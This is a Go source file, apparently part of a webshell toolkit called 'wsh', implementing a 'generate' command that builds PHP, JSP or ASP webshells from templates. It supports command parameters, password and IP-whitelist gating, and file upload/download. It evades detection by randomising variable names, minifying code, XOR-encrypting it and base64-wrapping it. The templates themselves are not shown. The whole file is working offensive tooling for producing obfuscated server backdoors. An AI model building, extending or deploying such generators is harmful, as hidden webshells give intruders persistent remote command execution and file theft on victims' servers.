package cmd

import (
	"bytes"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"regexp"
	"strings"
	"text/template"
	"time"

	"github.com/spf13/cobra"
	"github.com/spf13/viper"
)

var (
	lang               string
	method             string
	cmdParam           string
	cmdHeader          string
	whitelist          []string
	whitelistString    string
	password           string
	passwordHeader     string
	passwordParam      string
	xorKey             string
	xorParam           string
	xorHeader          string
	b64                bool
	noFileCapabilities bool
	minify             bool
	outFile            string
	templateFile       string

	seededRand *rand.Rand
)

type shellData struct {
	Method           string
	CmdParam         string
	CmdHeader        string
	Whitelist        string
	Password         string
	PasswordParam    string
	PasswordHeader   string
	PasswordHash     string
	EncMethod        string
	XorKey           string
	XorParam         string
	XorHeader        string
	EncParam         string
	EncHeader        string
	EncKey           string
	EncCode          string
	FileCapabilities bool
	V                map[string]string
}

// generateCmd represents the generate command
var generateCmd = &cobra.Command{
	Use:     "generate <lang> [flags]\n  wsh g <lang> [flags]",
	Aliases: []string{"g"},
	Short:   "Generate a webshell",
	Long:    `Webshell generate`,
	Run:     generate,
	Args: func(cmd *cobra.Command, args []string) error {
		if len(args) < 1 {
			return errors.New("language is required")
		}
		return nil
	},
}

func init() {
	rootCmd.AddCommand(generateCmd)

	seededRand = rand.New(rand.NewSource(time.Now().UnixNano()))

	generateCmd.Flags().StringSliceP("whitelist", "w", []string{}, "IP addresses to whitelist")
	viper.BindPFlag("whitelist", generateCmd.Flags().Lookup("whitelist"))

	generateCmd.Flags().String("pass", "", "Password protect shell")
	viper.BindPFlag("password", generateCmd.Flags().Lookup("pass"))

	generateCmd.Flags().String("pass-param", "", "Parameter for sending password")
	viper.BindPFlag("pass-param", generateCmd.Flags().Lookup("pass-param"))

	generateCmd.Flags().String("pass-header", "", "Header for sending password")
	viper.BindPFlag("pass-header", generateCmd.Flags().Lookup("pass-header"))

	generateCmd.Flags().String("xor-key", "", "Key for xor encryption")
	viper.BindPFlag("xor-key", generateCmd.Flags().Lookup("xor-key"))

	generateCmd.Flags().String("xor-param", "", "Parameter for sending xor key")
	viper.BindPFlag("xor-param", generateCmd.Flags().Lookup("xor-param"))

	generateCmd.Flags().String("xor-header", "", "Header for sending xor key")
	viper.BindPFlag("xor-header", generateCmd.Flags().Lookup("xor-header"))

	generateCmd.Flags().Bool("base64", false, "Base64 encode shell")
	viper.BindPFlag("base64", generateCmd.Flags().Lookup("base64"))

	generateCmd.Flags().Bool("no-file", false, "Disable file upload/download capabilities")
	viper.BindPFlag("no-file", generateCmd.Flags().Lookup("no-file"))

	generateCmd.Flags().Bool("minify", false, "Minify webshell code")
	viper.BindPFlag("minify", generateCmd.Flags().Lookup("minify"))

	generateCmd.Flags().StringP("template", "t", "", "Webshell template file")
	viper.BindPFlag("template", generateCmd.Flags().Lookup("template"))

	generateCmd.Flags().StringVarP(&outFile, "outfile", "o", "", "Output file")
}

func generate(cmd *cobra.Command, args []string) {
	lang = args[0]

	if cmdParam == "" && cmdHeader == "" {
		fmt.Println("--param or --header required.")
		os.Exit(1)
	}

	vNameMin := 3
	vNameMax := 7
	vNames := map[string]string{
		"cmd": genVarName(vNameMin, vNameMax), //php,jsp

		"whitelist": genVarName(vNameMin, vNameMax), //php,jsp

		"hash":     genVarName(vNameMin, vNameMax), //php,jsp
		"pass":     genVarName(vNameMin, vNameMax), //php,jsp
		"alg":      genVarName(vNameMin, vNameMax), //jsp
		"hashFunc": genVarName(vNameMin, vNameMax), //jsp
		"digest":   genVarName(vNameMin, vNameMax), //jsp
		"asc":      genVarName(vNameMin, vNameMax), //asp

		"cmdArgs":      genVarName(vNameMin, vNameMax), //php,jsp
		"filePath":     genVarName(vNameMin, vNameMax), //php,jsp
		"file":         genVarName(vNameMin, vNameMax), //jsp
		"fileStream":   genVarName(vNameMin, vNameMax), //jsp
		"fileContents": genVarName(vNameMin, vNameMax), //jsp
		"mimeType":     genVarName(vNameMin, vNameMax), //jsp
		"outStream":    genVarName(vNameMin, vNameMax), //jsp
		"buffer":       genVarName(vNameMin, vNameMax), //jsp
		"bytesRead":    genVarName(vNameMin, vNameMax), //jsp
		"destPath":     genVarName(vNameMin, vNameMax), //php
		"fs":           genVarName(vNameMin, vNameMax), //php

		"encKey":    genVarName(vNameMin, vNameMax), //php
		"encSrc":    genVarName(vNameMin, vNameMax), //php
		"xorKey":    genVarName(vNameMin, vNameMax), //php
		"dSrc":      genVarName(vNameMin, vNameMax), //php
		"process":   genVarName(vNameMin, vNameMax), //jsp
		"output":    genVarName(vNameMin, vNameMax), //jsp
		"encObj":    genVarName(vNameMin, vNameMax), //asp
		"b64":       genVarName(vNameMin, vNameMax), //asp
		"binStream": genVarName(vNameMin, vNameMax), //asp
		"keyChar":   genVarName(vNameMin, vNameMax), //asp

		"i":         genVarName(vNameMin, vNameMax), //php
		"ii":        genVarName(vNameMin, vNameMax), //php
		"msxmlVar":  genVarName(vNameMin, vNameMax), //asp
		"base64Var": genVarName(vNameMin, vNameMax), //asp

		"var0": genVarName(vNameMin, vNameMax), //future shells
		"var1": genVarName(vNameMin, vNameMax), //future shells
		"var2": genVarName(vNameMin, vNameMax), //future shells
		"var3": genVarName(vNameMin, vNameMax), //future shells
		"var4": genVarName(vNameMin, vNameMax), //future shells
		"var5": genVarName(vNameMin, vNameMax), //future shells
		"var6": genVarName(vNameMin, vNameMax), //future shells
		"var7": genVarName(vNameMin, vNameMax), //future shells
		"var8": genVarName(vNameMin, vNameMax), //future shells
		"var9": genVarName(vNameMin, vNameMax), //future shells
	}

	d := shellData{
		Method:           method,
		CmdParam:         cmdParam,
		CmdHeader:        cmdHeader,
		Password:         password,
		PasswordParam:    passwordParam,
		PasswordHeader:   passwordHeader,
		XorKey:           xorKey,
		XorParam:         xorParam,
		XorHeader:        xorHeader,
		FileCapabilities: !noFileCapabilities,
		V:                vNames,
	}

	// Convert whitelist slice to string array format
	if len(whitelist) > 0 {
		whitelistString = "\""
		for i, ip := range whitelist {
			whitelistString += ip
			if i != len(whitelist)-1 {
				whitelistString += "\",\""
			} else {
				whitelistString += "\""
			}
		}
		d.Whitelist = whitelistString
	}

	// If using password, calculate md5 hash
	if password != "" {
		if passwordParam == "" && passwordHeader == "" {
			fmt.Println("Password parameter or header required")
			os.Exit(1)
		}

		hash := md5.Sum([]byte(password))
		d.PasswordHash = hex.EncodeToString(hash[:])
	}

	// Fix php/asp headers
	if lang == "php" || lang == "asp" {
		d.PasswordHeader = fmtHeader(passwordHeader)
		d.XorHeader = fmtHeader(xorHeader)
		d.CmdHeader = fmtHeader(cmdHeader)
	}

	// Load template
	tmpl := template.New("shell")
	var err error
	if templateFile != "" {
		tmpl, err = template.ParseFiles(templateFile)
	} else {
		if lang == "php" {
			tmpl, err = tmpl.Parse(phpTemplate)
		} else if lang == "jsp" {
			tmpl, err = tmpl.Parse(jspTemplate)
		} else {
			tmpl, err = tmpl.Parse(aspTemplate)
		}
	}
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	// Parse template into code
	buf := new(bytes.Buffer)
	err = tmpl.Execute(buf, d)
	if err != nil {
		panic(err)
	}
	code := buf.String()
	buf.Reset()

	// Remove excessive new lines
	r := regexp.MustCompile("[\n\n]{2,}")
	code = r.ReplaceAllString(code, "\n")

	// Minify code
	if minify || b64 || xorKey != "" {
		r := regexp.MustCompile("[ \n\n]{2,}")
		code = r.ReplaceAllString(code, "\n")
		if lang == "php" {
			code = strings.ReplaceAll(code, "\n", "")
			code = strings.ReplaceAll(code, " ", "")
		}
	}

	// If encrypting or encoding
	if xorKey != "" {
		code = xor(code, xorKey)
		code = base64.StdEncoding.EncodeToString([]byte(code))
		d.EncCode = code
		err := tmpl.ExecuteTemplate(buf, "xor", d)
		if err != nil {
			panic(err)
		}

		code = buf.String()
		buf.Reset()
	}

	// If base64 encoding
	if b64 {
		code = base64.StdEncoding.EncodeToString([]byte(code))
		code = strings.ReplaceAll(code, string('\x10'), "")
		d.EncCode = code
		err := tmpl.ExecuteTemplate(buf, "b64", d)
		if err != nil {
			panic(err)
		}

		code = buf.String()
		buf.Reset()
	}

	// Add opening and closing brackets
	if lang == "php" {
		code = fmt.Sprintf("<?php %s?>", code)
	} else if lang == "asp" {
		code = fmt.Sprintf("<%%%s%%>", code)
	}

	// Write to file
	if outFile != "" {
		err = ioutil.WriteFile(outFile, []byte(code), 0644)
		if err != nil {
			fmt.Printf("Error writing to file: %v\n", outFile)
			return
		}
		fmt.Printf("Created shell at %s.\n", outFile)
	} else {
		fmt.Println(code)
	}
}

// XOR generated code
func xor(s, key string) (output string) {
	for i := 0; i < len(s); i++ {
		output += string(s[i] ^ key[i%len(key)])
	}
	return output
}

// Format php/asp header keys
func fmtHeader(h string) string {
	h = strings.ReplaceAll(h, "-", "_")
	h = strings.ToUpper(h)

	return h
}

// Generate random variable name
func genVarName(min, max int) string {
	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	l := seededRand.Intn(max-min) + min
	b := make([]byte, l)

	for i := range b {
		b[i] = charset[seededRand.Intn(len(charset))]
	}

	name := string(b)
	if lang == "php" {
		name = "$" + name
	}

	return name
}
